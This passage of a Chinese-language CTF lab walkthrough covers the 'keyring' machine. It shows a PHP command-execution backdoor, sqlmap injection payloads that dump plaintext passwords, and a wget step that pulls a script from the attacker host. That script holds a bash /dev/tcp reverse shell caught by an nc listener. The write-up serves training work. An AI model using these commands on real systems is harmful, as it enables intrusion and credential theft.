invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;HTTP Parameter Pollution or HPP in short is a vulnerability that occurs&lt;br&gt;due to passing of multiple parameters having same name&quot;</span>;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;insert into log (name , page_visited , date_time) values (&#x27;<span class="subst">$name</span>&#x27;,&#x27;control&#x27;,&#x27;<span class="subst">$date</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;Date &amp; Time : &quot;</span>.<span class="variable">$date</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmdcntr&#x27;</span>]); <span class="comment">//system() function is not safe to use , dont&#x27; forget to remove it in production .</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>告诉我们会执行cmdcntr这个参数的命令，他没有及时删除<br>但是我直接在url利用发现并没有显示给我<br><img src="https://pic1.imgdb.cn/item/67a4c6a0d0e0a243d4fc53d1.png"><br>这里卡住了，看了视频知道，这个必须是管理员的账户才能用这个后门<br>发现过程：把源码下载下来，用git diff找出不同</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="code"><pre><span class="line">(base) kakeru@bogon Downloads % git clone https:<span class="comment">//github.com/cyberbot75/keyring.git</span></span><br><span class="line">Cloning into <span class="string">&#x27;keyring&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: <span class="number">21</span>, done.</span><br><span class="line">remote: Counting objects: <span class="number">100</span>% (<span class="number">21</span>/<span class="number">21</span>), done.</span><br><span class="line">remote: Compressing objects: <span class="number">100</span>% (<span class="number">17</span>/<span class="number">17</span>), done.</span><br><span class="line">remote: Total <span class="number">21</span> (delta <span class="number">9</span>), reused <span class="number">0</span> (delta <span class="number">0</span>), pack-reused <span class="number">0</span> (from <span class="number">0</span>)</span><br><span class="line">Receiving objects: <span class="number">100</span>% (<span class="number">21</span>/<span class="number">21</span>), <span class="number">6.26</span> KiB | <span class="number">3.13</span> MiB/s, done.</span><br><span class="line">Resolving deltas: <span class="number">100</span>% (<span class="number">9</span>/<span class="number">9</span>), done.</span><br><span class="line">(base) kakeru@bogon Downloads % cd keyring </span><br><span class="line">(base) kakeru@bogon keyring % git <span class="keyword">log</span></span><br><span class="line">commit <span class="number">9215</span>fbd50358462a5868c04bfe93ea549c101a2b (HEAD -&gt; main, origin/main, origin/HEAD)</span><br><span class="line">Author: cyberbot75 &lt;<span class="number">79827735</span>+cyberbot75@users.noreply.github.com&gt;</span><br><span class="line">Date:   Mon Jun <span class="number">21</span> <span class="number">19</span>:<span class="number">07</span>:<span class="number">49</span> <span class="number">2021</span> +<span class="number">0530</span></span><br><span class="line"></span><br><span class="line">    Update <span class="keyword">control</span>.php</span><br><span class="line"></span><br><span class="line">commit d63d664e940253192aa05f4b5afe46204452f574</span><br><span class="line">Author: cyberbot75 &lt;<span class="number">79827735</span>+cyberbot75@users.noreply.github.com&gt;</span><br><span class="line">Date:   Mon Jun <span class="number">21</span> <span class="number">18</span>:<span class="number">33</span>:<span class="number">18</span> <span class="number">2021</span> +<span class="number">0530</span></span><br><span class="line"></span><br><span class="line">    Update <span class="keyword">control</span>.php</span><br><span class="line"></span><br><span class="line">commit <span class="number">460</span>cb9f1bf00701403393d4546797eee17121700</span><br><span class="line">Author: cyberbot75 &lt;<span class="number">79827735</span>+cyberbot75@users.noreply.github.com&gt;</span><br><span class="line">Date:   Thu Jun <span class="number">10</span> <span class="number">18</span>:<span class="number">56</span>:<span class="number">41</span> <span class="number">2021</span> +<span class="number">0530</span></span><br><span class="line"></span><br><span class="line">    Update <span class="keyword">control</span>.php</span><br><span class="line"></span><br><span class="line">commit <span class="number">1</span>a772923c80cb07d621d6e654a4e78819126e0a9</span><br><span class="line">Author: cyberbot75 &lt;<span class="number">79827735</span>+cyberbot75@users.noreply.github.com&gt;</span><br><span class="line">Date:   Thu Jun <span class="number">10</span> <span class="number">18</span>:<span class="number">55</span>:<span class="number">32</span> <span class="number">2021</span> +<span class="number">0530</span></span><br><span class="line"></span><br><span class="line">    Add files via upload</span><br><span class="line">(base) kakeru@bogon keyring % git diff <span class="number">9215</span>fbd50358462a5868c04bfe93ea549c101a2b <span class="number">460</span>cb9f1bf00701403393d4546797eee17121700</span><br><span class="line">diff --git a/html/<span class="keyword">control</span>.php b/html/<span class="keyword">control</span>.php</span><br><span class="line">index <span class="number">3</span>bb3250.<span class="number">.823</span>b4c5 <span class="number">100644</span></span><br><span class="line">--- a/html/<span class="keyword">control</span>.php</span><br><span class="line">+++ b/html/<span class="keyword">control</span>.php</span><br><span class="line">@@ <span class="number">-1</span>,<span class="number">5</span> +<span class="number">1</span>,<span class="number">3</span> @@</span><br><span class="line">-Code <span class="keyword">for</span> staging server</span><br><span class="line">-</span><br><span class="line"> &lt;!DOCTYPE html&gt;</span><br><span class="line"> &lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">@@ <span class="number">-53</span>,<span class="number">7</span> +<span class="number">51</span>,<span class="number">10</span> @@ <span class="keyword">if</span>(isset($_SESSION[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">        $conn = mysqli_connect($servername, $username, $password, $database);</span><br><span class="line">        $name = $_SESSION[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $date =  <span class="keyword">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">-       echo <span class="string">&quot;HTTP Parameter Pollution or HPP in short is a vulnerability that occurs&lt;br&gt;due to passing of multiple parameters having same name&quot;</span>;</span><br><span class="line">+</span><br><span class="line">+       <span class="keyword">if</span>($name===<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">+       &#123;</span><br><span class="line">+               echo <span class="string">&quot;HTTP Parameter Pollution or HPP in short is a vulnerability that occurs&lt;br&gt;due to passing of multiple parameters having same name&quot;</span>;</span><br><span class="line">                $sql = <span class="string">&quot;insert into log (name , page_visited , date_time) values (&#x27;$name&#x27;,&#x27;control&#x27;,&#x27;$date&#x27;)&quot;</span>;</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">if</span>(mysqli_query($conn,$sql))</span><br><span class="line">@@ <span class="number">-61</span>,<span class="number">7</span> +<span class="number">62</span>,<span class="number">12</span> @@ <span class="keyword">if</span>(isset($_SESSION[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">                                echo <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">                                echo <span class="string">&quot;Date &amp; Time : &quot;</span>.$date;</span><br><span class="line">                        &#125;</span><br><span class="line">-               <span class="keyword">system</span>($_GET[<span class="string">&#x27;cmdcntr&#x27;</span>]); <span class="comment">//system() function is not safe to use , dont&#x27; forget to remove it in production .</span></span><br><span class="line">+               <span class="keyword">system</span>($_GET[<span class="string">&#x27;timer&#x27;</span>]); <span class="comment">//system() is not safe to use , dont&#x27; forget to remove it  in latest release .</span></span><br><span class="line">+       &#125;</span><br><span class="line">:</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>先用sqlmap进行注入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# sqlmap -u 192.168.240.230/history.php?<span class="attribute">user</span>=kakeru <span class="attribute">--cookie</span>=<span class="string">&quot;PHPSESSID=fe7jj1h3ab3nh81dubr28mim8g&quot;</span> --batch --dbs</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.8.12#stable&#125;</span><br><span class="line">|_ -| . [,]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [(]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   https://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility <span class="keyword">to</span> obey all applicable local, state <span class="keyword">and</span> federal laws. Developers assume <span class="literal">no</span> liability <span class="keyword">and</span> are <span class="keyword">not</span> responsible <span class="keyword">for</span> any misuse <span class="keyword">or</span> damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 20:54:45 /2025-02-06/</span><br><span class="line"></span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] testing<span class="built_in"> connection </span><span class="keyword">to</span> the target URL</span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] checking <span class="keyword">if</span> the target is protected by some kind of WAF/IPS</span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] testing <span class="keyword">if</span> the target URL content is stable</span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] target URL content is stable</span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] testing <span class="keyword">if</span> <span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span> is dynamic</span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] <span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span> appears <span class="keyword">to</span> be dynamic</span><br><span class="line">[20:54:45] [<span class="built_in">WARNING</span>] heuristic (basic) test shows that <span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span> might <span class="keyword">not</span> be injectable</span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] testing <span class="keyword">for</span> SQL injection on <span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span></span><br><span class="line">[20:54:45] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">WARNING</span>] reflective value(s) found <span class="keyword">and</span> filtering out</span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;PostgreSQL AND error-based - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Generic inline queries&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;PostgreSQL &gt; 8.1 stacked queries (comment)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Microsoft SQL Server/Sybase stacked queries (comment)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#x27;</span></span><br><span class="line">[20:54:46] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span></span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] <span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span> appears <span class="keyword">to</span> be <span class="string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span> injectable </span><br><span class="line">it looks like the back-end DBMS is <span class="string">&#x27;MySQL&#x27;</span>. <span class="keyword">Do</span> you want <span class="keyword">to</span> skip test payloads specific <span class="keyword">for</span> other DBMSes? [Y/n] Y</span><br><span class="line"><span class="keyword">for</span> the remaining tests, <span class="keyword">do</span> you want <span class="keyword">to</span> include all tests <span class="keyword">for</span> <span class="string">&#x27;MySQL&#x27;</span> extending provided level (1) <span class="keyword">and</span> risk (1) values? [Y/n] Y</span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] testing <span class="string">&#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span></span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] automatically extending ranges <span class="keyword">for</span> UNION query injection technique tests as there is at least one other (potential) technique found</span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] target URL appears <span class="keyword">to</span> be UNION injectable with 1 columns</span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] <span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span> is <span class="string">&#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span> injectable</span><br><span class="line"><span class="built_in">GET</span> parameter <span class="string">&#x27;user&#x27;</span> is vulnerable. <span class="keyword">Do</span> you want <span class="keyword">to</span> keep testing the others (<span class="keyword">if</span> any)? [y/N] N</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 74 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter:<span class="built_in"> user </span>(GET)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 <span class="keyword">AND</span> time-based blind (query SLEEP)</span><br><span class="line">    Payload: <span class="attribute">user</span>=kakeru&#x27; <span class="keyword">AND</span> (SELECT 9710 <span class="keyword">FROM</span> (SELECT(SLEEP(5)))Gxfh) <span class="keyword">AND</span> <span class="string">&#x27;flol&#x27;</span>=<span class="string">&#x27;flol</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 1 column</span></span><br><span class="line"><span class="string">    Payload: user=kakeru&#x27;</span> UNION ALL SELECT CONCAT(0x7178787871,0x65647271467a6477744472684547474a74614e4e59464276706668634d4f4d5576495a45414a6b72,0x717a6a7a71)-- -</span><br><span class="line">---</span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] the back-end DBMS is MySQL</span><br><span class="line">web<span class="built_in"> server </span>operating system: Linux Ubuntu 18.04 (bionic)</span><br><span class="line">web application technology: Apache 2.4.29</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] fetching database names</span><br><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br><span class="line">[*]<span class="built_in"> users</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line">[20:54:56] [<span class="built_in">INFO</span>] fetched data logged <span class="keyword">to</span> text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.240.230&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 20:54:56 /2025-02-06/</span><br><span class="line"></span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# sqlmap -u 192.168.240.230/history.php?<span class="attribute">user</span>=kakeru <span class="attribute">--cookie</span>=<span class="string">&quot;PHPSESSID=fe7jj1h3ab3nh81dubr28mim8g&quot;</span> --batch -D<span class="built_in"> users </span>--tables</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">&quot;]_____ ___ ___  &#123;1.8.12#stable&#125;</span></span><br><span class="line"><span class="string">|_ -| . [&quot;</span>]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   https://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility <span class="keyword">to</span> obey all applicable local, state <span class="keyword">and</span> federal laws. Developers assume <span class="literal">no</span> liability <span class="keyword">and</span> are <span class="keyword">not</span> responsible <span class="keyword">for</span> any misuse <span class="keyword">or</span> damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 20:55:57 /2025-02-06/</span><br><span class="line"></span><br><span class="line">[20:55:57] [<span class="built_in">INFO</span>] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span> </span><br><span class="line">[20:55:57] [<span class="built_in">INFO</span>] testing<span class="built_in"> connection </span><span class="keyword">to</span> the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) <span class="keyword">from</span> stored session:</span><br><span class="line">---</span><br><span class="line">Parameter:<span class="built_in"> user </span>(GET)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 <span class="keyword">AND</span> time-based blind (query SLEEP)</span><br><span class="line">    Payload: <span class="attribute">user</span>=kakeru&#x27; <span class="keyword">AND</span> (SELECT 9710 <span class="keyword">FROM</span> (SELECT(SLEEP(5)))Gxfh) <span class="keyword">AND</span> <span class="string">&#x27;flol&#x27;</span>=<span class="string">&#x27;flol</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 1 column</span></span><br><span class="line"><span class="string">    Payload: user=kakeru&#x27;</span> UNION ALL SELECT CONCAT(0x7178787871,0x65647271467a6477744472684547474a74614e4e59464276706668634d4f4d5576495a45414a6b72,0x717a6a7a71)-- -</span><br><span class="line">---</span><br><span class="line">[20:55:57] [<span class="built_in">INFO</span>] the back-end DBMS is MySQL</span><br><span class="line">web<span class="built_in"> server </span>operating system: Linux Ubuntu 18.04 (bionic)</span><br><span class="line">web application technology: Apache 2.4.29</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[20:55:57] [<span class="built_in">INFO</span>] fetching tables <span class="keyword">for</span> database: <span class="string">&#x27;users&#x27;</span></span><br><span class="line">[20:55:58] [<span class="built_in">WARNING</span>] reflective value(s) found <span class="keyword">and</span> filtering out</span><br><span class="line">Database:<span class="built_in"> users</span></span><br><span class="line"><span class="built_in"></span>[2 tables]</span><br><span class="line">+---------+</span><br><span class="line">| log     |</span><br><span class="line">| details |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">[20:55:58] [<span class="built_in">INFO</span>] fetched data logged <span class="keyword">to</span> text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.240.230&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 20:55:57 /2025-02-06/</span><br><span class="line"></span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# sqlmap -u 192.168.240.230/history.php?<span class="attribute">user</span>=kakeru <span class="attribute">--cookie</span>=<span class="string">&quot;PHPSESSID=fe7jj1h3ab3nh81dubr28mim8g&quot;</span> --batch -D<span class="built_in"> users </span>-T details --columns --dump</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.8.12#stable&#125;</span><br><span class="line">|_ -| . [<span class="string">&quot;]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   https://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 20:56:16 /2025-02-06/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[20:56:16] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[20:56:16] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: user (GET)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: user=kakeru&#x27; AND (SELECT 9710 FROM (SELECT(SLEEP(5)))Gxfh) AND &#x27;flol&#x27;=&#x27;flol</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 1 column</span></span><br><span class="line"><span class="string">    Payload: user=kakeru&#x27; UNION ALL SELECT CONCAT(0x7178787871,0x65647271467a6477744472684547474a74614e4e59464276706668634d4f4d5576495a45414a6b72,0x717a6a7a71)-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[20:56:16] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">web server operating system: Linux Ubuntu 18.04 (bionic)</span></span><br><span class="line"><span class="string">web application technology: Apache 2.4.29</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[20:56:16] [INFO] fetching columns for table &#x27;details&#x27; in database &#x27;users&#x27;</span></span><br><span class="line"><span class="string">[20:56:16] [WARNING] reflective value(s) found and filtering out</span></span><br><span class="line"><span class="string">Database: users</span></span><br><span class="line"><span class="string">Table: details</span></span><br><span class="line"><span class="string">[2 columns]</span></span><br><span class="line"><span class="string">+----------+-------------+</span></span><br><span class="line"><span class="string">| Column   | Type        |</span></span><br><span class="line"><span class="string">+----------+-------------+</span></span><br><span class="line"><span class="string">| name     | varchar(20) |</span></span><br><span class="line"><span class="string">| password | varchar(22) |</span></span><br><span class="line"><span class="string">+----------+-------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[20:56:16] [INFO] fetching columns for table &#x27;details&#x27; in database &#x27;users&#x27;</span></span><br><span class="line"><span class="string">[20:56:16] [INFO] fetching entries for table &#x27;details&#x27; in database &#x27;users&#x27;</span></span><br><span class="line"><span class="string">Database: users</span></span><br><span class="line"><span class="string">Table: details</span></span><br><span class="line"><span class="string">[3 entries]</span></span><br><span class="line"><span class="string">+--------+-----------------------+</span></span><br><span class="line"><span class="string">| name   | password              |</span></span><br><span class="line"><span class="string">+--------+-----------------------+</span></span><br><span class="line"><span class="string">| admin  | myadmin#p4szw0r4d     |</span></span><br><span class="line"><span class="string">| john   | Sup3r<span class="variable">$S3cr3t</span><span class="variable">$PasSW0RD</span> |</span></span><br><span class="line"><span class="string">| kakeru | kakeru                |</span></span><br><span class="line"><span class="string">+--------+-----------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[20:56:16] [INFO] table &#x27;users.details&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.240.230/dump/users/details.csv&#x27;</span></span><br><span class="line"><span class="string">[20:56:16] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.240.230&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 20:56:16 /2025-02-06/</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>
<p>获取到admin密码之后登录，然后在control.php这里用?cmdcntr执行命令反弹webshell<br>我先试了nc的反弹shell，但是不行，所以上传一个反弹shell的php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="keyword">cp</span> /usr/share/webshells/php/php-<span class="built_in">reverse</span>-<span class="keyword">shell</span>.php .        </span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="keyword">ls</span></span><br><span class="line"><span class="number">51224</span>.<span class="keyword">py</span>  aaa    <span class="keyword">b</span>    <span class="keyword">b</span>.txt  id_rsa    php-<span class="built_in">reverse</span>-<span class="keyword">shell</span>.php  reports     rockyou.txt</span><br><span class="line"><span class="keyword">a</span>         <span class="keyword">a</span>.txt  bbb  id     pass.txt  pspy64                 <span class="built_in">reverse</span>.<span class="keyword">sh</span>  tmp</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="keyword">python3</span> -<span class="keyword">m</span> http.server <span class="number">80</span></span><br><span class="line">Serving HTTP <span class="keyword">on</span> <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">80</span> (http://<span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">80</span>/) ...</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>但是这样虽然接收到了，但是不知道接收之后的路径，也没法弹shell<br>我一开始用php-reverse-shell.php,一直没成功访问到路径，后面经过群主提醒，直接用php就可以执行。<br>还可以先输入命令ls -al看看权限<br>那就用reverse.sh来反弹shell 写到&#x2F;tmp目录中，当前目录一般都是root创的没有权限</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.240.230</span>/control.php?cmdcntr=wget%<span class="number">20192</span>.<span class="number">168</span>.<span class="number">240</span>.<span class="number">11</span>/reverse.sh%<span class="number">20</span>-O%<span class="number">20</span>/tmp/re.sh</span><br><span class="line"><span class="attribute">http</span>://<span class="number">192.168.240.230</span>/control.php?cmdcntr=bash%<span class="number">20</span>/tmp/re.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">                                                                                                                  </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># cat reverse.sh                                                            </span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">240.11</span>/<span class="number">1234</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nc -lp 1234</span></span><br><span class="line">id</span><br><span class="line">pwd</span><br><span class="line"><span class="symbol">bash:</span> cannot set terminal process group (<span class="number">627</span>): <span class="title class_">Inappropriate</span> ioctl <span class="keyword">for</span> device</span><br><span class="line"><span class="symbol">bash:</span> no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span>id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span>pwd</span><br><span class="line">/var/www/html</span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span></span><br></pre></td></tr></table></figure></div>
<p>美化终端：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">script -qc /bin/bash /dev/null</span><br><span class="line">ctrl + z挂起</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">reset</span><br><span class="line">xterm</span><br><span class="line">本机<span class="built_in">stty</span> -a 查看自己的  rows columns</span><br><span class="line"><span class="built_in">stty</span>  rows 35 columns 115</span><br></pre></td></tr></table></figure></div>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>sudo 和 suid都没有可以利用的</p>
